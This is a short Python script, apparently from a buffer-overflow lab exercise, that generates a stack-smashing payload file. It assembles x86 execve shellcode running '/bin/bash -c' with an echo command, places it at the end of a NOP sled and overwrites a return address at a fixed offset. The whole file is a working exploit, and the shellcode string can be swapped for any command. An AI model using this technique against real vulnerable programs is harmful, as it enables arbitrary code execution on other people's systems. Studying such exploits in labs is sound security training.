#!/usr/bin/python3
#exploit2.py
import sys

shellcode= (
    #push the command '/bin////bash' into stack (//// is equal to /)
    "\x31\xc0"      # xorl %eax, %eax
    "\x50"          # pushl %eax
    "\x68""bash"    # pushl "bash"
    "\x68""////"    # pushl "////"
    "\x68""/bin"    # pushl "/bin"
    "\x89\xe3"      # movl %esp, %ebx

    #push the 1st argment '-ccc' into stack (-ccc is equal to -c)
    "\x31\xc0"      # xorl %eax, %eax
    "\x50"          # pushl %eax
    "\x68""-ccc"    # pushl "-ccc"
    "\x89\xe0"      # movl %esp, %eax

    #push the 2nd argment '/bin/echo "Hello World!"' into stack
    "\x31\xd2"      # xorl %edx, %edx
    "\x52"          # pushl %edx
    "\x68""!\"  "   # pushl "!\"  "
    "\x68""orld"    # pushl "orld"
    "\x68""lo W"    # pushl "lo W"
    "\x68""\"Hel"   # pushl "\"Hel"
    "\x68""o   "    # pushl "o   "
    "\x68""/ech"    # pushl "/ech"
    "\x68""/bin"    # pushl "/bin"
    "\x89\xe2"      # movl %esp, %edx


    #Construct the argv[] array and set ecx
    "\x31\xc9"      # xorl %ecx, %ecx
    "\x51"          # pushl %ecx
    "\x52"          # pushl %edx
    "\x50"          # pushl %eax
    "\x53"          # pushl %ebx
    "\x89\xe1"      # movl %esp, %ecx

    # Set edx to 0
    "\x31\xd2"      # xorl %edx, %edx

    #Invoke the system call
    "\x31\xc0"      # xorl %eax, %eax
    "\xb0\x0b"      # movb $0x0b, %al
    "\xcd\x80"      # int $0x80
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(800)) 

# Put the shellcode at the end
start = 800 - len(shellcode)
content[start:] = shellcode

# put the address at offset 112
ret    = 0xffffcf18 + 200
content[112:116] = (ret).to_bytes(4,byteorder='little') 

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
